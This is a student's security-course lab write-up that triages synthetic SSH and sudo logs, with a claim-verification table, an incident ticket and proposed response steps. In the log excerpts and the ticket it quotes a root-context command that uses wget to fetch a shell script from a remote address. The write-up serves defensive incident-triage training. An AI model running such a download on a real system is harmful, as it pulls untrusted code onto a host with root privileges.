title: SecAI+ Lab 4: AI as a SOC assistant

blocks.text: SecAI+ Lab 4: AI as a SOC assistant
Bright Omari Owusu | Software Security | November 4, 2026 (Central)
AI assistance was used for the initial analysis and draft verification.

This exercise uses six synthetic instructor-provided logs. The host and timezone are unknown. The records show authentication events and a sudo command, but leave authorization and attack outcomes unresolved. All response actions below are proposals; none was performed. No supplied IP or URL was contacted.
Source logs
L1

Original AI analysis
Observations

Three SSH password failures targeted root (twice) and admin from 185.220.101.4 over five seconds. Thirteen seconds later, SSH accepted a password for jdoe from that same address. At 02:14:40, sudo recorded jdoe requesting /usr/bin/wget as root to retrieve http://203.0.113.50/x.sh. This line does not establish successful retrieval, file contents, or script execution.

blocks.text: Hypotheses and severity

The early sequence is consistent with password guessing followed by use of a valid account and an attempted privileged file download. Unauthorized access is plausible, but authorization, credential theft, and compromise are unconfirmed. Three failures alone do not establish a sustained brute-force campaign. A .sh filename does not prove malicious content.

blocks.text: Verification

Correct means the stated claim is supported by a log or cited source. Unsupported marks an unproved hypothesis or severity judgment, including reasonable ones. Qualified statements are assessed as written; separate rows address whether the proposed attack actually occurred. No incorrect factual claim was found. L1-L6 refer to the source logs above.

Verdict
Evidence and reasoning
V10: 10.0.4.22 is a private address.
Correct
RFC 1918 §3; L6. RFC 1918 section 3 reserves 10.0.0.0-10.255.255.255. The source falls in that range; this does not establish authorization.
V11: No evidence links mlee login to earlier sequence or establishes authorization.
Correct
L1-L6. Account, source and time differ. No correlation or approval record connects the events; their independence is also unproved.
V16: Authorization, credential theft, and compromise are unconfirmed.
Correct
Full L1-L6. No approval record, credential-acquisition evidence or independent compromise evidence is supplied.
V17: Three failures do not establish a sustained brute-force campaign.
Correct
L1-L3. Only three failures across five seconds are shown; sustained activity is unproved.
V18: A .sh filename does not prove malicious content.
Correct
L5. Only the URL filename is visible. File contents are absent.
V20: Successful password login immediately follows failures from same source.
Correct
L1-L4. L4 is the next supplied event, 13 seconds after the last failure. Immediately describes proximity, not zero delay.
V21: Login is followed by a root-context download command.
Correct
L4-L5. L5 follows L4 by 38 seconds. A common session is plausible, but no shared session identifier proves it.
V23: Actual download success, execution, persistence and data theft are not shown.
Correct
Full L1-L6. No transfer outcome, execution, persistence or exfiltration evidence appears.
V29: Root-context sudo is recorded; adversarial privilege escalation is a hypothesis.
Correct
L5; official MITRE. L5 records sudo with USER=root. Adversarial escalation remains a hypothesis; caching and sudoers abuse are not shown.
V33: SSH is observed; adversarial remote-service use is conditional; lateral movement is not established.
Correct
L1-L4, L6; official MITRE. SSH appears in L1-L4 and L6. Adversarial use is conditional and lateral movement unestablished; MITRE assigns this to Lateral Movement.

blocks.text: Incident ticket
Suspicious SSH password login followed by a root-context wget command

Status: open for triage. Affected account: jdoe. Host and timezone: unknown. The source is 185.220.101.4; the command URL is http://203.0.113.50/x.sh. The mlee login is a separate, unverified event, with no established connection to jdoe or confirmed affected-account status.

Severity: provisional high triage priority. Three password failures precede accepted jdoe authentication from the same source, followed by a sudo command as root. Unauthorized privileged activity could materially affect the host, so the sequence warrants urgent review. Actual impact remains unknown.
jdoe : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.50/x.sh

The excerpt does not prove a successful download, script execution, malware, account or host compromise, attribution, lateral movement, persistence or data theft. L4 and L5 lack a shared session identifier. The mlee event is neither confirmed benign nor malicious.

blocks.text: First three response actions
Preserve authentication, sudo, process, network and file evidence. Identify the host and timezone and correlate surrounding records.
Verify jdoe's login and command with the account owner and approved activity records. Separately validate mlee's source and key.
Determine wget outcome. Inspect any existing destination file, hash, contents, ownership and subsequent process activity without executing the file. Review other sessions and privilege changes.

If unauthorized activity is confirmed or active risk requires containment, later response may include isolating the host, ending suspicious sessions and revoking affected credentials through incident-response procedures.
